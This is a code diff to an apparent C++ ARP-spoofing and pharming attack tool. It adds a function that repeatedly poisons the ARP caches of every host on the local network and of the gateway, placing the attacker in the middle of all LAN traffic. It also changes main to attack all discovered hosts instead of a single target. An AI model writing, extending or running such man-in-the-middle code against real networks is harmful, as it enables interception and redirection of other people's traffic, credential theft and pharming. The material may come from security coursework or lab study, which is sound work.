@@ -16,12 +16,33 @@
 
 #include <linux/if_packet.h>
 
+#include <linux/netfilter.h>		
+#include <libnetfilter_queue/libnetfilter_queue.h>
 
 #include "arp.h"
 #include "scan.h"
 #include "spoof.h"
 #include "pharm_attack.h"
 
+/**
+ * target all the neighbors in the local network
+ * @param gateway_ip the ip address of gateway in std::string
+ * @param answered_list the list of all the hosts in the local area network
+ * @param spoof_operator the spoof operator
+ */
+void arp_spoofing(std::string gateway_ip, std::vector<std::pair<std::string, std::string>> answered_list, SpoofOperator *spoof_operator) {
+    // run for 100 iterations
+    for (int t = 0; t < 100; t++) {
+        std::cout << "spoofing iteration: " << t << std::endl;
+        for (auto i = 0; i < answered_list.size(); i++) {
+            if (answered_list[i].first != gateway_ip) {
+                spoof_operator->attack(answered_list[i].first, gateway_ip);
+                spoof_operator->attack(gateway_ip, answered_list[i].first);
+            }
+        }
+        sleep(2);
+    }
+}
 
 int main()
 {
@@ -107,9 +128,7 @@ int main()
     arp_operator.prepare_unicast();
     arp_operator.prepare_header_values();
 
-
-    spoof_operator.attack(target_ip, gateway_ip);
-    spoof_operator.attack(gateway_ip, target_ip);
+    arp_spoofing(gateway_ip, answered_list, &spoof_operator);
 
     return 0;
 }
